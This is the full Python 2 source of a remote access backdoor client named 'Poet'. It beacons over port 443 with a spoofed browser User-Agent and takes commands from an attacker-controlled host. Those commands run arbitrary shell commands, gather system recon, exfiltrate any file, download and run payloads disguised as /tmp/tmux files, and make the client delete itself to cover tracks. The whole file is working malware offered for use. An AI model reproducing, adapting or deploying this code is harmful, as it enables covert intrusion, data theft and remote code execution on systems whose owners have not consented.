#!/usr/bin/python2.7

import os
import re
import sys
import stat
import time
import base64
import random
import socket
import struct
import os.path
import urllib2
import argparse
import logging as log
import subprocess as sp
from datetime import datetime

SBUF_LEN = 9
SIZE = 4096
UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'


class PoetSocket(object):
    """Socket wrapper for data transfer."""

    def __init__(self, socket):
        self.s = socket

    def close(self):
        self.s.close()

    def exchange(self, msg):
        self.send(msg)
        return self.recv()

    def send(self, msg):
        """
            Sends message using socket operating under the convention that the
            message is prefixed by a big-endian 32 bit value indicating the
            length of the following base64 string.
        """

        pkg = base64.b64encode(msg)
        pkg_size = struct.pack('>i', len(pkg))
        sent = self.s.sendall(pkg_size + pkg)
        if sent:
            raise socket.error('socket connection broken')

    def recv(self):
        """
            Receives message from socket operating under the convention that
            the message is prefixed by a big-endian 32 bit value indicating the
            length of the following base64 string.

            Returns the message.

            TODO: Under high network loads, it's possible that the initial recv
            may not even return the first 9 bytes so another loop is necessary
            to ascertain that.
        """

        chunks = []
        bytes_recvd = 0
        initial = self.s.recv(SIZE)
        if not initial:
            raise socket.error('socket connection broken')
        msglen, initial = (struct.unpack('>I', initial[:4])[0], initial[4:])
        bytes_recvd = len(initial)
        chunks.append(initial)
        while bytes_recvd < msglen:
            chunk = self.s.recv(min((msglen - bytes_recvd, SIZE)))
            if not chunk:
                raise socket.error('socket connection broken')
            chunks.append(chunk)
            bytes_recvd += len(chunk)
        return base64.b64decode(''.join(chunks))


class PoetSocketClient(PoetSocket):
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        super(PoetSocketClient, self).__init__(self.s)


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str)
    parser.add_argument('delay', metavar='DELAY', type=int, help='(s)')
    parser.add_argument('-p', '--port')
    parser.add_argument('-v', '--verbose', action="store_true")
    return parser.parse_args()


def is_active(host, port):
    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        req = urllib2.Request(url, headers={'User-Agent': UA})
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
    except urllib2.URLError:
        pass
    return False


def shell_client(host, port):
    s = PoetSocketClient(host, port)
    while True:
        try:
            inp = s.recv()
            if inp == 'fin':
                break
            elif inp == 'getprompt':
                s.send(get_prompt())
            elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                s.send(shell_exec(inp))
            elif inp == 'recon':
                s.send(shell_recon())
            elif inp.startswith('shell '):
                s.send(cmd_exec(inp[6:]).strip())
            elif inp.startswith('exfil '):
                try:
                    with open(os.path.expanduser(inp[6:])) as f:
                        s.send(f.read())
                except IOError as e:
                    s.send(e.strerror)
            elif inp == 'selfdestruct':
                try:
                    os.remove(__file__)
                    if __file__.strip('./') not in os.listdir('.'):
                        s.send('boom')
                        sys.exit()
                    else:
                        raise Exception('client not deleted')
                except Exception as e:
                    s.send(str(e.message))
            elif inp.startswith('dlexec'):
                try:
                    shell_dlexec(inp)
                    s.send('done')
                except Exception as e:
                    s.send(str(e.message))
            else:
                s.send('Unrecognized')
        except socket.error as e:
            if e.message == 'too much data!':
                s.send('psh : ' + e.message)
            else:
                raise
    s.close()


def shell_exec(inp):
    out = ''
    cmds = parse_exec_cmds(inp)
    for cmd in cmds:
        cmd_out = cmd_exec(cmd)
        out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
    return out


def shell_recon():
    ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
    exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
    return shell_exec(exec_str)


def shell_dlexec(inp):
    r = urllib2.urlopen(inp.split()[1])
    rand = str(random.random())[2:6]
    tmp = '/tmp/tmux-{}'.format(rand)
    with open(tmp, 'w') as f:
        f.write(r.read())
        os.fchmod(f.fileno(), stat.S_IRWXU)
    sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)


def cmd_exec(cmd):
    return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                    shell=True).communicate()[0]


def get_prompt():
    user = cmd_exec('whoami').strip()
    hn = cmd_exec('hostname').strip()
    end = '#' if user == 'root' else '$'
    return '{}@{} {} '.format(user, hn, end)


def parse_exec_cmds(inp):
    cmds = []
    inp = inp[5:]
    num_cmds = inp.count('"') / 2
    for i in range(num_cmds):
        first = inp.find('"')
        second = inp.find('"', first+1)
        cmd = inp[first+1:second]
        cmds.append(cmd)
        inp = inp[second+2:]
    return cmds


def main():
    args = get_args()

    if args.verbose:
        log.basicConfig(format='%(message)s', level=log.INFO)
    else:
        log.basicConfig(format='%(message)s')

    DELAY = args.delay
    HOST = args.host
    PORT = int(args.port) if args.port else 443

    log.info(('[+] Poet started with delay of {} seconds to port {}.' +
              ' Ctrl-c to exit.').format(DELAY, PORT))

    try:
        while True:
            if is_active(HOST, PORT):
                log.info('[+] ({}) Server is active'.format(datetime.now()))
                shell_client(HOST, PORT)
            else:
                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
            time.sleep(DELAY)
    except KeyboardInterrupt:
        print
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
    except socket.error as e:
        log.info('[!] ({}) Socket error: {}'.format(datetime.now(), e.message))
        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
        sys.exit(0)

if __name__ == '__main__':
    main()
